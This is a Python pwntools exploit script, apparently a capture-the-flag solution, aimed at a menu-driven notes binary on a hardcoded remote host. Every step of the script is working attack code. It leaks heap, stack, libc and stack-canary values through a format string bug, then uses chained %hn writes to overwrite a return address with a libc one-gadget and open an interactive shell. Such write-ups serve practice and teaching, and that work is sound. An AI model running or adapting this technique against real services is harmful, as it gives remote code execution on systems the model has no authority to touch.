#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '139.162.160.184', 19999
binary = './bin'
debug_base = 0x0000555555554000
brkpts = '''
b*{}
b printf
b*{}
b system
'''.format(str(debug_base + 0x1079), str(debug_base + 0x16da))

elf = ELF("./bin")
libc = ELF("libc-2.27.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def menu(i):
    sla("[Q]uit\n",str(i))

def add(title,content):
    menu("s")
    sla("title\n",str(title))
    sla("Type content\n",str(content))

def print_record(title):
    menu("r")
    sla("Type title\n",str(title))

def update_title(title,new_title):
    menu("m")
    sla("Type title\n",str(title))
    sla("Type new title\n",str(new_title))

def update_content(title,content):
    menu("u")
    sla("Type title\n",str(title))
    sla("Type content\n",str(content))

def free(title):
    menu("d")
    sla("Type title\n",str(title))

def print_all():
    menu("p")

def quit():
    menu("q")

if __name__=="__main__":
    add("a"*5,"%p"*(16+29))
    print_record("a"*5)
    leaks = reu("[")[:-1]
    print(leaks)
    heap = int(str(leaks)[:14],16) - 0x268
    stack = int(str(leaks)[48:62], 16) + 0x108 - 0xb0
    byte = int("0x"+hex(stack)[-4:], 16)
    log.info("stack = " + hex(stack))
    libc.address = int(str(leaks)[-15:],16) - 0x21bf7
    log.info("heap = " + hex(heap))

    canary = int(str(leaks)[-47:-29],16)
    log.success("libc - " + hex(libc.address))
    log.success("canary - " + hex(canary))
    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh\x00"))
    pop_rdi = libc.address + 0x00000000000215bf
    gadget = libc.address + [0x4f3d5, 0x4f432, 0xe546f, 0xe5617, 0xe561e, 0xe5622, 0x10a41c, 0x10a428][1]

    payload = "%{}d".format(byte - 14)+"%c"*14 + "%hn"
    add("b"*5,payload)
    print_record("b"*5)

    payload = "%{}d%22$hn".format(int(hex(gadget)[-4:], 16))
    add("c"*5,payload)
    print_record("c"*5)

    payload = "%{}d".format(byte - 14 + 2)+"%c"*14 + "%hn"
    add("d"*5,payload)
    print_record("d"*5)

    payload = "%{}d%22$hn".format(int(hex(gadget)[-8:-4], 16))
    add("e"*5,payload)
    print_record("e"*5)

    payload = "%{}d".format(byte - 14 + 4)+"%c"*14 + "%hn"
    add("f"*5,payload)
    print_record("f"*5)

    payload = "%{}d%22$hn".format(int(hex(gadget)[-12:-8], 16))
    add("g"*5,payload)
    print_record("g"*5)

    gdb.attach(io,brkpts)
    quit()

    io.interactive()